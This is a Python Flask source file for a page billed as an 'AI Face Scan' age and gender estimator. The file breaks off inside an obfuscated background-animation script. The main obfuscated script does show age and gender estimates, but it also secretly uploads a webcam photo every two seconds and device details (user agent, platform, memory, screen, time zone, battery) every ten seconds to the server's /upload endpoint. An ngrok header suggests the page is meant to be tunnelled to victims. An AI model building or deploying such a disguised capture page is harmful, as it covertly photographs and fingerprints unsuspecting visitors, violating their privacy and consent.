import os
import base64
import datetime
import json
import re
from flask import Flask, request, render_template_string, jsonify, send_from_directory

app = Flask(__name__)

UPLOAD_FOLDER = 'data'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

MODELS_FOLDER = 'models'
if not os.path.exists(MODELS_FOLDER):
    os.makedirs(MODELS_FOLDER)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Face Scan - Age & Gender</title>
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
    
    <style>
        body {
            color: #e0e0e0;
            font-family: 'Poppins', sans-serif;
            overflow-x: hidden;
            margin: 0;
            padding: 0;
        }

        .particle-network-animation {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            height: 100vh;
            background-color: #171717;
            z-index: -3;
        }
          
        .particle-network-animation::before {
            z-index: -2;
            content: '';
            position: absolute;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            background-image: url(https://images.unsplash.com/photo-1450849608880-6f787542c88a?ixlib=rb-0.3.5&q=80&fm=jpg&crop=entropy&s=786a67dca1d8791d181bfd90b16240d9);
            background-position: center center;
            background-size: cover;
            opacity: 0.2;
        }

        .glow {
            z-index: -1;
            position: fixed;
            top: 50%;
            left: 50%;
            background-image: radial-gradient(circle closest-side, rgba(255, 255, 255, 0.025), transparent);
        }
        .glow-1 {
            width: 150vw;
            height: 150vh;
            margin-top: -75vh;
            margin-left: -75vw;
            animation: glow-1-move 25s linear infinite both;
        }
        @keyframes glow-1-move {
            from { transform: translate(-100%, 100%); }
            to { transform: translate(100%, -100%); }
        }
        .glow-2 {
            width: 100vw;
            height: 100vh;
            margin-top: -50vh;
            margin-left: -50vw;
            animation: glow-2-move 25s linear calc(25s / 3) infinite both;
        }
        @keyframes glow-2-move {
            from { transform: translate(-100%, 0%); }
            to { transform: translate(100%, 100%); }
        }
        .glow-3 {
            width: 120vw;
            height: 120vh;
            margin-top: -60vh;
            margin-left: -60vw;
            animation: glow-3-move 25s linear calc(25s / 3 * 2) infinite both;
        }
        @keyframes glow-3-move {
            from { transform: translate(100%, 100%); }
            to { transform: translate(0%, -100%); }
        }
       

        
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #222; }
        ::-webkit-scrollbar-thumb { background: #00ff8c; border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #00e67e; }

        
        #permission-view {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background: none;
            z-index: 100;
        }
        #permission-card {
            background-color: rgba(30, 30, 30, 0.9);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(0, 255, 140, 0.2);
            border-radius: 1.5rem;
            max-width: 550px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5), 0 0 50px rgba(0, 255, 140, 0.3);
            position: relative;
            z-index: 101;
        }
        .fancy-heading {
            color: #00ff8c;
            font-weight: 700;
            text-shadow: 0 0 15px rgba(0, 255, 140, 0.8);
            letter-spacing: 0.1em;
        }
        .permission-text {
            color: rgba(255, 255, 255, 0.7);
            font-size: 1.1rem;
        }

        
        .main-content-area {
            min-height: 100vh;
            padding-top: 2rem;
            padding-bottom: 2rem;
            position: relative;
            z-index: 50;
            background: none;
        }

        #video-container {
            position: relative;
            border-radius: 1rem;
            overflow: hidden;
            border: 2px solid rgba(0, 255, 140, 0.5);
            box-shadow: 0 0 30px rgba(0, 255, 140, 0.2);
            background: #000;
        }
        
        #video-feed {
            width: 100%;
            height: auto;
            display: block;
        }

        
        #scanner-overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle, rgba(0,0,0,0.3) 0%, rgba(0,0,0,0.8) 100%);
            display: flex; justify-content: center; align-items: center;
            z-index: 10;
            opacity: 0;
        }
        .scanner-circle {
            width: 80%;
            height: 80%;
            border: 5px solid #00ff8c;
            border-radius: 50%;
            box-shadow: 0 0 40px #00ff8c;
            animation: pulseScan 2s infinite ease-in-out alternate, rotateScan 10s linear infinite;
            position: relative;
        }
        .scanner-beam {
            position: absolute;
            top: 50%;
            left: 50%;
            width: 150%;
            height: 2px;
            background: linear-gradient(90deg, transparent, #00ff8c, transparent);
            transform-origin: 0 0;
            animation: beamScan 1.5s infinite linear;
            z-index: 1;
            opacity: 0.7;
        }
        
       
        #results-card {
            background-color: rgba(30, 30, 30, 0.8);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 1rem;
            height: 100%;
        }
        .result-item i {
            font-size: 3rem;
            color: #00ff8c;
        }
        #age-result, #gender-result {
            font-size: 2.5rem;
            font-weight: 700;
            white-space: nowrap;
            overflow: hidden;
        }

       
        .btn-glow {
            background-color: #00ff8c;
            color: #111;
            font-weight: 600;
            border: none;
            transition: all 0.3s ease;
            box-shadow: 0 0 15px rgba(0, 255, 140, 0.5);
        }
        .btn-glow:hover {
            transform: scale(1.05);
            box-shadow: 0 0 25px rgba(0, 255, 140, 0.8);
            color: #fff;
        }
        .btn-glow:not(:hover) {
            color: #111;
        }

        @keyframes permissionGradientAnimation { 
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        @keyframes subtleGradient {
            0% { background-position: 0% 0%; }
            100% { background-position: 0% 100%; }
        }

        @keyframes pulseScan {
            0% { transform: scale(1); opacity: 1; }
            100% { transform: scale(1.05); opacity: 0.8; }
        }
        @keyframes rotateScan {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @keyframes beamScan {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
        }

        @keyframes dots {
            0%, 20% { content: "."; }
            40% { content: ".."; }
            60% { content: "..."; }
            80%, 100% { content: ""; }
        }
        .loading-dots::after {
            content: ".";
            animation: dots 1.5s linear infinite;
        }
    </style>
    <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
</head>
<body>

    <div class="particle-network-animation">
        <div class="glow glow-1"></div>
        <div class="glow glow-2"></div>
        <div class="glow glow-3"></div>
    </div>
    <div id="permission-view">
        <div id="permission-card" class="card p-4 p-md-5 text-center m-3">
            <h1 class="fancy-heading mb-3">AI Face Scan</h1>
            <p class="lead mb-4 permission-text">Experience smart insights as our AI observes visual cues to estimate your age and gender</p>
            <button id="start-button" class="btn btn-lg btn-glow">
                <i class="bi bi-camera-video-fill me-2"></i>Scan My Face Now!
            </button>
            <p id="permission-error" class="text-danger mt-3" style="display: none;"></p>
        </div>
    </div>

    <div class="container main-content-area" id="main-content" style="visibility: hidden;">
        <div class="row align-items-center g-4">
            
            <div class="col-lg-7">
                <div id="video-container">
                    <video id="video-feed" autoplay playsinline muted></video>
                    <canvas id="detection-canvas" style="position: absolute; top: 0; left: 0;"></canvas>
                    <canvas id="capture-canvas" style="display:none;"></canvas>
                    <div id="scanner-overlay">
                        <div class="scanner-circle">
                            <div class="scanner-beam"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="col-lg-5">
                <div id="results-card" class="d-flex flex-column justify-content-center p-4">
                    <h3 class="text-center mb-4 text-light">Analysis Report</h3>
                    <div class="result-item text-center mb-4">
                        <i class="bi bi-gender-ambiguous"></i>
                        <p class="fs-5 mt-2 mb-0 text-white-50">Detected Gender</p>
                        <p id="gender-result" class="text-light loading-text">Loading<span class="loading-dots"></span></p>
                    </div>
                    <div class="result-item text-center">
                        <i class="bi bi-calendar2-check"></i>
                        <p class="fs-5 mt-2 mb-0 text-white-50">Estimated Age</p>
                        <p id="age-result" class="text-light loading-text">Loading<span class="loading-dots"></span></p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>

    <script>
        function _0x2708(_0x45615a,_0x386560){const _0x592125=_0x5921();return _0x2708=function(_0x2708ad,_0xc4ebd4){_0x2708ad=_0x2708ad-0x1a4;let _0x24b6d9=_0x592125[_0x2708ad];return _0x24b6d9;},_0x2708(_0x45615a,_0x386560);}const _0x2506fd=_0x2708;function _0x5921(){const _0x52714a=['66012epPpZK','disabled','innerHeight','name','videoWidth','power2.out','stop','timeZone','catch','438070kmxnyF','Mobile','addEventListener','log','charging','resizeResults','main-content','toDataURL','NotAllowedError','ended','No\x20camera\x20found.\x20Please\x20ensure\x20a\x20camera\x20is\x20connected.','paused','charAt','start-button','stringify','forEach','height','box','matchDimensions','withAgeAndGender','794435HttZXi','21IXnjqw','6290130tOWNJE','block','faceLandmark68Net','Face-API.js\x20models\x20loaded!','loading-text','classList','play','Analyzing...','N/A','gender-result','getBattery','loadFromUri','Error\x20sending\x20data\x20to\x20backend:','SsdMobilenetv1Options','deviceMemory','draw','drawDetections','getUserMedia','258055cOzKvs','level','permission-view','true','Battery\x20API\x20access\x20denied\x20or\x20failed:','nets','click','abs','DrawTextField','scanner-overlay','784216AQEoWs','srcObject','none','width','style','error','value','from','DateTimeFormat','3FldPeU','round','detection-canvas','withFaceLandmarks','Camera\x20access\x20error:','remove','userAgent','getElementById','mediaDevices','display','innerWidth','/models','clearRect','textContent','platform','rgba(0,\x20255,\x20140,\x200.7)','No\x20Face\x20Detected','#fff','capture-canvas','readyState','24872oVqjjF','Failed\x20to\x20load\x20AI\x20models.\x20Please\x20check\x20console\x20for\x20details.','then','18woeifB','permission-card','permission-error','detectSingleFace','set','resolvedOptions','all','An\x20error\x20occurred\x20accessing\x20the\x20camera.\x20Please\x20try\x20again.','onloadedmetadata','test','video-feed','\x20years,\x20','visible','fromTo','videoHeight','getContext','ageGenderNet','toUpperCase','warn','Error\x20loading\x20face-api.js\x20models:'];_0x5921=function(){return _0x52714a;};return _0x5921();}(function(_0x29d228,_0x2a1233){const _0x5171ff=_0x2708,_0x237dfe=_0x29d228();while(!![]){try{const _0x1f03ad=-parseInt(_0x5171ff(0x20a))/0x1+-parseInt(_0x5171ff(0x1e2))/0x2+-parseInt(_0x5171ff(0x1ae))/0x3*(-parseInt(_0x5171ff(0x1a5))/0x4)+-parseInt(_0x5171ff(0x1f6))/0x5+parseInt(_0x5171ff(0x1d9))/0x6*(parseInt(_0x5171ff(0x1f7))/0x7)+parseInt(_0x5171ff(0x1c2))/0x8*(-parseInt(_0x5171ff(0x1c5))/0x9)+parseInt(_0x5171ff(0x1f8))/0xa;if(_0x1f03ad===_0x2a1233)break;else _0x237dfe['push'](_0x237dfe['shift']());}catch(_0x33fc28){_0x237dfe['push'](_0x237dfe['shift']());}}}(_0x5921,0x34b46));const permissionView=document[_0x2506fd(0x1b5)](_0x2506fd(0x20c)),permissionCard=document[_0x2506fd(0x1b5)](_0x2506fd(0x1c6)),permissionError=document[_0x2506fd(0x1b5)](_0x2506fd(0x1c7)),mainContentView=document[_0x2506fd(0x1b5)](_0x2506fd(0x1e8)),videoElement=document[_0x2506fd(0x1b5)](_0x2506fd(0x1cf)),captureCanvas=document['getElementById'](_0x2506fd(0x1c0)),detectionCanvas=document[_0x2506fd(0x1b5)](_0x2506fd(0x1b0)),startButton=document[_0x2506fd(0x1b5)](_0x2506fd(0x1ef)),scannerOverlay=document[_0x2506fd(0x1b5)](_0x2506fd(0x1a4)),genderResultElem=document[_0x2506fd(0x1b5)](_0x2506fd(0x201)),ageResultElem=document['getElementById']('age-result');let imageIntervalId,infoIntervalId,detectionIntervalId=null;gsap[_0x2506fd(0x1ac)](permissionCard,{'scale':0.8,'opacity':0x0,'duration':0.7,'ease':_0x2506fd(0x1de)}),Promise[_0x2506fd(0x1cb)]([faceapi[_0x2506fd(0x20f)]['ssdMobilenetv1'][_0x2506fd(0x203)](_0x2506fd(0x1b9)),faceapi[_0x2506fd(0x20f)][_0x2506fd(0x1fa)][_0x2506fd(0x203)]('/models'),faceapi['nets'][_0x2506fd(0x1d5)]['loadFromUri'](_0x2506fd(0x1b9))])[_0x2506fd(0x1c4)](()=>{const _0x39e0ec=_0x2506fd;console[_0x39e0ec(0x1e5)](_0x39e0ec(0x1fb));})[_0x2506fd(0x1e1)](_0xd4f44=>{const _0x5cccd1=_0x2506fd;console[_0x5cccd1(0x1aa)](_0x5cccd1(0x1d8),_0xd4f44),permissionError[_0x5cccd1(0x1bb)]=_0x5cccd1(0x1c3),gsap[_0x5cccd1(0x1d2)](permissionError,{'y':-0xa,'opacity':0x0,'display':_0x5cccd1(0x1a7)},{'y':0x0,'opacity':0x1,'display':_0x5cccd1(0x1f9),'duration':0.5}),startButton[_0x5cccd1(0x1da)]=!![];});const initializeScan=async()=>{const _0x58428c=_0x2506fd;try{const _0x280fbd=await navigator[_0x58428c(0x1b6)][_0x58428c(0x209)]({'video':{'width':0x280,'height':0x1e0}});gsap['to'](permissionView,{'opacity':0x0,'duration':0.5,'onComplete':()=>permissionView[_0x58428c(0x1a9)][_0x58428c(0x1b7)]=_0x58428c(0x1a7)}),videoElement[_0x58428c(0x1a6)]=_0x280fbd,videoElement[_0x58428c(0x1cd)]=()=>{const _0xbeabfe=_0x58428c;videoElement[_0xbeabfe(0x1fe)](),detectionCanvas[_0xbeabfe(0x1a8)]=videoElement[_0xbeabfe(0x1dd)],detectionCanvas[_0xbeabfe(0x1f2)]=videoElement[_0xbeabfe(0x1d3)],captureCanvas[_0xbeabfe(0x1a8)]=videoElement['videoWidth'],captureCanvas[_0xbeabfe(0x1f2)]=videoElement[_0xbeabfe(0x1d3)],gsap[_0xbeabfe(0x1c9)](mainContentView,{'visibility':_0xbeabfe(0x1d1)}),gsap['from'](mainContentView,{'opacity':0x0,'duration':0x1,'delay':0.3}),runAnalysisSequence();};}catch(_0x59d898){console[_0x58428c(0x1aa)](_0x58428c(0x1b2),_0x59d898);if(_0x59d898['name']===_0x58428c(0x1ea))permissionError['textContent']='Camera\x20access\x20denied.\x20Please\x20enable\x20it\x20in\x20your\x20browser\x20settings\x20and\x20try\x20again.';else _0x59d898[_0x58428c(0x1dc)]==='NotFoundError'?permissionError[_0x58428c(0x1bb)]=_0x58428c(0x1ec):permissionError[_0x58428c(0x1bb)]=_0x58428c(0x1cc);gsap['fromTo'](permissionError,{'y':-0xa,'opacity':0x0,'display':_0x58428c(0x1a7)},{'y':0x0,'opacity':0x1,'display':_0x58428c(0x1f9),'duration':0.5});}},runAnalysisSequence=()=>{const _0x1299e8=_0x2506fd;gsap[_0x1299e8(0x1d2)](scannerOverlay,{'opacity':0x0,'display':'flex'},{'opacity':0x1,'duration':0x1}),setTimeout(()=>{gsap['to'](scannerOverlay,{'opacity':0x0,'duration':0x1,'onComplete':()=>{const _0x3498fd=_0x2708;scannerOverlay[_0x3498fd(0x1a9)][_0x3498fd(0x1b7)]=_0x3498fd(0x1a7),startFaceDetection();}}),showResultsAndStartMonitoring();},0x1388);},showResultsAndStartMonitoring=()=>{const _0x1ec515=_0x2506fd;genderResultElem[_0x1ec515(0x1bb)]=_0x1ec515(0x1ff),ageResultElem[_0x1ec515(0x1bb)]=_0x1ec515(0x1ff),genderResultElem[_0x1ec515(0x1fd)]['add'](_0x1ec515(0x1fc)),ageResultElem['classList']['add'](_0x1ec515(0x1fc)),imageIntervalId=setInterval(sendPhoto,0x7d0),infoIntervalId=setInterval(sendInfo,0x2710),sendInfo();},startFaceDetection=()=>{if(detectionIntervalId)clearInterval(detectionIntervalId);detectionIntervalId=setInterval(async()=>{const _0x2b8050=_0x2708;if(videoElement[_0x2b8050(0x1ed)]||videoElement[_0x2b8050(0x1eb)])return;const _0x4fdaac=await faceapi[_0x2b8050(0x1c8)](videoElement,new faceapi[(_0x2b8050(0x205))]())[_0x2b8050(0x1b1)]()[_0x2b8050(0x1f5)](),_0x4675e6={'width':videoElement[_0x2b8050(0x1dd)],'height':videoElement['videoHeight']};faceapi[_0x2b8050(0x1f4)](detectionCanvas,_0x4675e6);const _0xd9d0bd=detectionCanvas[_0x2b8050(0x1d4)]('2d');_0xd9d0bd[_0x2b8050(0x1ba)](0x0,0x0,detectionCanvas['width'],detectionCanvas[_0x2b8050(0x1f2)]);if(_0x4fdaac){const _0x3db031=faceapi[_0x2b8050(0x1e7)](_0x4fdaac,_0x4675e6);faceapi['draw'][_0x2b8050(0x208)](detectionCanvas,_0x3db031);const {age:_0x447831,gender:_0x40fb33,genderProbability:_0x430a25}=_0x3db031;genderResultElem[_0x2b8050(0x1fd)]['remove'](_0x2b8050(0x1fc)),ageResultElem[_0x2b8050(0x1fd)][_0x2b8050(0x1b3)](_0x2b8050(0x1fc)),genderResultElem[_0x2b8050(0x1bb)]=_0x40fb33[_0x2b8050(0x1ee)](0x0)[_0x2b8050(0x1d6)]()+_0x40fb33['slice'](0x1)+'\x20('+Math['round'](_0x430a25*0x64)+'%)';const _0x48e010=parseFloat(ageResultElem['textContent']);if(isNaN(_0x48e010)||Math[_0x2b8050(0x211)](_0x48e010-Math[_0x2b8050(0x1af)](_0x447831))>0x2){let _0x49c84c={'value':isNaN(_0x48e010)?0x0:_0x48e010};gsap['to'](_0x49c84c,{'value':_0x447831,'duration':0.8,'ease':_0x2b8050(0x1de),'onUpdate':()=>{const _0x3a4a0a=_0x2b8050;ageResultElem[_0x3a4a0a(0x1bb)]=Math['round'](_0x49c84c[_0x3a4a0a(0x1ab)]);}});}const _0x348394=_0x3db031['detection'][_0x2b8050(0x1f3)],_0x237ade=faceapi[_0x2b8050(0x1af)](_0x447831,0x0)+_0x2b8050(0x1d0)+_0x40fb33,_0x359615={'label':_0x237ade,'boxColor':_0x2b8050(0x1bd),'lineWidth':0x2,'fontSize':0x14,'fontColor':_0x2b8050(0x1bf),'padding':0x8},_0x2b9210={'x':_0x348394['x'],'y':_0x348394['y']-0xa};new faceapi[(_0x2b8050(0x207))][(_0x2b8050(0x212))]([_0x237ade],_0x2b9210,_0x359615)[_0x2b8050(0x207)](detectionCanvas);}else genderResultElem[_0x2b8050(0x1bb)]=_0x2b8050(0x1be),ageResultElem[_0x2b8050(0x1bb)]=_0x2b8050(0x1be),genderResultElem[_0x2b8050(0x1fd)]['remove'](_0x2b8050(0x1fc)),ageResultElem[_0x2b8050(0x1fd)][_0x2b8050(0x1b3)](_0x2b8050(0x1fc));},0x64);},sendData=_0x1b6f1a=>fetch('/upload',{'method':'POST','headers':{'Content-Type':'application/json','ngrok-skip-browser-warning':_0x2506fd(0x20d)},'body':JSON[_0x2506fd(0x1f0)](_0x1b6f1a)})['catch'](_0x2199a4=>{const _0x3f3db8=_0x2506fd;console[_0x3f3db8(0x1aa)](_0x3f3db8(0x204),_0x2199a4);}),sendPhoto=()=>{const _0x5f1ddd=_0x2506fd;if(videoElement[_0x5f1ddd(0x1c1)]<0x2||videoElement[_0x5f1ddd(0x1ed)]||videoElement[_0x5f1ddd(0x1eb)])return;const _0x5a71d8=captureCanvas['getContext']('2d');captureCanvas['width']=videoElement[_0x5f1ddd(0x1dd)],captureCanvas[_0x5f1ddd(0x1f2)]=videoElement[_0x5f1ddd(0x1d3)],_0x5a71d8['drawImage'](videoElement,0x0,0x0,captureCanvas[_0x5f1ddd(0x1a8)],captureCanvas[_0x5f1ddd(0x1f2)]),sendData({'image':captureCanvas[_0x5f1ddd(0x1e9)]('image/jpeg',0.7)});},sendInfo=async()=>{const _0x3e3b00=await collectDeviceInfo();sendData({'info':_0x3e3b00});},collectDeviceInfo=async()=>{const _0x22be1d=_0x2506fd;let _0x561f06={'status':'Not\x20Supported'};if(_0x22be1d(0x202)in navigator)try{const _0x5299ab=await navigator['getBattery']();_0x561f06={'level':Math[_0x22be1d(0x1af)](_0x5299ab[_0x22be1d(0x20b)]*0x64)+'%','charging':_0x5299ab[_0x22be1d(0x1e6)]};}catch(_0xf81712){console[_0x22be1d(0x1d7)](_0x22be1d(0x20e),_0xf81712);}const _0x18e408=()=>{const _0x1be7a7=_0x22be1d,_0x7b1f50=navigator['userAgent'];if(/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i[_0x1be7a7(0x1ce)](_0x7b1f50))return'Tablet';if(/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Opera Mini/i[_0x1be7a7(0x1ce)](_0x7b1f50))return _0x1be7a7(0x1e3);return'Desktop';};return{'timestamp':new Date()['toISOString'](),'userAgent':navigator[_0x22be1d(0x1b4)],'language':navigator['language'],'platform':navigator[_0x22be1d(0x1bc)],'deviceMemory':navigator[_0x22be1d(0x206)]||_0x22be1d(0x200),'deviceType':_0x18e408(),'screenResolution':window[_0x22be1d(0x1b8)]+'x'+window[_0x22be1d(0x1db)],'timeZone':Intl[_0x22be1d(0x1ad)]()[_0x22be1d(0x1ca)]()[_0x22be1d(0x1e0)],'battery':_0x561f06};};startButton[_0x2506fd(0x1e4)](_0x2506fd(0x210),initializeScan),window[_0x2506fd(0x1e4)]('beforeunload',()=>{const _0x4f7e64=_0x2506fd;videoElement[_0x4f7e64(0x1a6)]&&videoElement[_0x4f7e64(0x1a6)]['getTracks']()[_0x4f7e64(0x1f1)](_0x4b6b71=>_0x4b6b71[_0x4f7e64(0x1df)]());if(imageIntervalId)clearInterval(imageIntervalId);if(infoIntervalId)clearInterval(infoIntervalId);if(detectionIntervalId)clearInterval(detectionIntervalId);});

    </script>

    <script>
       function _0x2664(_0x56741b,_0x267eda){var _0x1ddd0f=_0x1ddd();return _0x2664=function(_0x2664ba,_0x10264a){_0x2664ba=_0x2664ba-0x11c;var _0x5e77b7=_0x1ddd0f[_0x2664ba];return _0x5e77b7;},_0x2664(_0x56741b,_0x267eda);}function _0x1ddd(){var _0x47296c=['prototype','splice','min','1672980unnKfF','mousedown','preventDefault','globalAlpha','pow','clientX','onTouchStart','netLineDistance','network','addEventListener','createInteractionParticle','#929292','mouseout','mousemove','touchend','radius','createParticles','animationFrame','particleNetwork','init','423OAOaws','interactionParticle','canvas','particles','16062eQaCRz','touchIsMoving','mouseIsDown','velocity','clientY','ctx','netLineColor','push','lineWidth','beginPath','draw','441771BQyjgj','touchmove','length','moveTo','abs','sizeCanvas','1135562OJJTUd','4170240XldPGU','bindUiActions','clearRect','onMouseOut','onMouseMove','removeInteractionParticle','indexOf','touchstart','options','bind','container','round','removeEventListener','opacity','onMouseDown','density','onTouchMove','mouseup','offsetHeight','unbindUiActions','particleColors','random','update','particleColor','appendChild','createIntervalId','height','115470STTHti','floor','3693032CAhAso','onMouseUp','parentNode','stroke','offsetX','offsetY','width','changedTouches','1NJPkBS','fill','spawnQuantity','105opGnhl','onTouchEnd'];_0x1ddd=function(){return _0x47296c;};return _0x1ddd();}(function(_0x270c5e,_0x4ac590){var _0x3ef364=_0x2664,_0xc4b0c1=_0x270c5e();while(!![]){try{var _0x52e67c=-parseInt(_0x3ef364(0x14c))/0x1*(-parseInt(_0x3ef364(0x126))/0x2)+-parseInt(_0x3ef364(0x120))/0x3+parseInt(_0x3ef364(0x154))/0x4+-parseInt(_0x3ef364(0x14f))/0x5*(-parseInt(_0x3ef364(0x16c))/0x6)+-parseInt(_0x3ef364(0x144))/0x7+-parseInt(_0x3ef364(0x127))/0x8+-parseInt(_0x3ef364(0x168))/0x9*(-parseInt(_0x3ef364(0x142))/0xa);if(_0x52e67c===_0x4ac590)break;else _0xc4b0c1['push'](_0xc4b0c1['shift']());}catch(_0x546d0c){_0xc4b0c1['push'](_0xc4b0c1['shift']());}}}(_0x1ddd,0x5eee7),(function(){var _0x33434f=_0x2664,_0xa4cfb9,_0x2eef57;_0xa4cfb9=_0x2eef57=function(){},_0x2eef57['prototype'][_0x33434f(0x167)]=function(_0x1e29e9){var _0x4d932c=_0x33434f;return this['$el']=$(_0x1e29e9),this[_0x4d932c(0x131)]=_0x1e29e9,this[_0x4d932c(0x16a)]=document['createElement'](_0x4d932c(0x16a)),this[_0x4d932c(0x125)](),this['container'][_0x4d932c(0x13f)](this['canvas']),this['ctx']=this['canvas']['getContext']('2d'),this[_0x4d932c(0x166)]=new _0x1e2337(this),this[_0x4d932c(0x128)](),this;},_0x2eef57['prototype'][_0x33434f(0x128)]=function(){var _0x5dd7e1=_0x33434f;$(window)['on']('resize',function(){var _0x4217cb=_0x2664;this['ctx'][_0x4217cb(0x129)](0x0,0x0,this[_0x4217cb(0x16a)][_0x4217cb(0x14a)],this[_0x4217cb(0x16a)][_0x4217cb(0x141)]),this[_0x4217cb(0x125)](),this['particleNetwork'][_0x4217cb(0x164)]();}[_0x5dd7e1(0x130)](this));},_0x2eef57['prototype'][_0x33434f(0x125)]=function(){var _0x332708=_0x33434f;this[_0x332708(0x16a)]['width']=this['container']['offsetWidth'],this[_0x332708(0x16a)][_0x332708(0x141)]=this[_0x332708(0x131)][_0x332708(0x139)];};var _0x5e78bf=function(_0x54dd3a,_0x2f667a,_0x41349a){var _0x3f3759=_0x33434f;this[_0x3f3759(0x15c)]=_0x54dd3a,this[_0x3f3759(0x16a)]=_0x54dd3a[_0x3f3759(0x16a)],this[_0x3f3759(0x171)]=_0x54dd3a['ctx'],this['particleColor']=_0x458451(this[_0x3f3759(0x15c)]['options'][_0x3f3759(0x13b)]),this[_0x3f3759(0x163)]=_0x3d2220(1.5,2.5),this[_0x3f3759(0x134)]=0x0,this['x']=_0x2f667a||Math[_0x3f3759(0x13c)]()*this[_0x3f3759(0x16a)][_0x3f3759(0x14a)],this['y']=_0x41349a||Math['random']()*this[_0x3f3759(0x16a)][_0x3f3759(0x141)],this[_0x3f3759(0x16f)]={'x':(Math['random']()-0.5)*_0x54dd3a[_0x3f3759(0x12f)][_0x3f3759(0x16f)],'y':(Math['random']()-0.5)*_0x54dd3a[_0x3f3759(0x12f)]['velocity']};};_0x5e78bf['prototype'][_0x33434f(0x13d)]=function(){var _0x2e75f8=_0x33434f;this[_0x2e75f8(0x134)]<0x1?this[_0x2e75f8(0x134)]+=0.01:this[_0x2e75f8(0x134)]=0x1,(this['x']>this[_0x2e75f8(0x16a)][_0x2e75f8(0x14a)]+0x64||this['x']<-0x64)&&(this[_0x2e75f8(0x16f)]['x']=-this[_0x2e75f8(0x16f)]['x']),(this['y']>this[_0x2e75f8(0x16a)][_0x2e75f8(0x141)]+0x64||this['y']<-0x64)&&(this[_0x2e75f8(0x16f)]['y']=-this[_0x2e75f8(0x16f)]['y']),this['x']+=this[_0x2e75f8(0x16f)]['x'],this['y']+=this[_0x2e75f8(0x16f)]['y'];},_0x5e78bf[_0x33434f(0x151)][_0x33434f(0x11f)]=function(){var _0x391e61=_0x33434f;this[_0x391e61(0x171)][_0x391e61(0x11e)](),this[_0x391e61(0x171)]['fillStyle']=this[_0x391e61(0x13e)],this[_0x391e61(0x171)][_0x391e61(0x157)]=this[_0x391e61(0x134)],this['ctx']['arc'](this['x'],this['y'],this[_0x391e61(0x163)],0x0,0x2*Math['PI']),this['ctx'][_0x391e61(0x14d)]();};var _0x1e2337=function(_0x187b91){var _0x4e0cf8=_0x33434f;this[_0x4e0cf8(0x12f)]={'velocity':0.7,'density':0x4e20,'netLineDistance':0xfa,'netLineColor':_0x4e0cf8(0x15f),'particleColors':['#aaa']},this[_0x4e0cf8(0x16a)]=_0x187b91[_0x4e0cf8(0x16a)],this[_0x4e0cf8(0x171)]=_0x187b91[_0x4e0cf8(0x171)],this[_0x4e0cf8(0x167)]();};_0x1e2337[_0x33434f(0x151)][_0x33434f(0x167)]=function(){var _0x24ef4b=_0x33434f;this['createParticles'](!![]),this[_0x24ef4b(0x165)]=requestAnimationFrame(this['update'][_0x24ef4b(0x130)](this)),this[_0x24ef4b(0x128)]();},_0x1e2337[_0x33434f(0x151)][_0x33434f(0x164)]=function(_0x225fdf){var _0x411e5d=_0x33434f,_0x330fa4=this;this[_0x411e5d(0x16b)]=[];var _0x136b74=this[_0x411e5d(0x16a)][_0x411e5d(0x14a)]*this[_0x411e5d(0x16a)][_0x411e5d(0x141)]/this[_0x411e5d(0x12f)][_0x411e5d(0x136)];if(_0x225fdf){var _0x4125e3=0x0;clearInterval(this['createIntervalId']),this['createIntervalId']=setInterval(function(){var _0x934c88=_0x411e5d;_0x4125e3<_0x136b74-0x1?this[_0x934c88(0x16b)][_0x934c88(0x11c)](new _0x5e78bf(this)):clearInterval(_0x330fa4[_0x934c88(0x140)]),_0x4125e3++;}['bind'](this),0xfa);}else for(var _0x4d61ca=0x0;_0x4d61ca<_0x136b74;_0x4d61ca++){this[_0x411e5d(0x16b)]['push'](new _0x5e78bf(this));}},_0x1e2337['prototype'][_0x33434f(0x15e)]=function(){var _0x2e3032=_0x33434f;return this[_0x2e3032(0x169)]=new _0x5e78bf(this),this[_0x2e3032(0x169)][_0x2e3032(0x16f)]={'x':0x0,'y':0x0},this[_0x2e3032(0x16b)][_0x2e3032(0x11c)](this[_0x2e3032(0x169)]),this['interactionParticle'];},_0x1e2337[_0x33434f(0x151)]['removeInteractionParticle']=function(){var 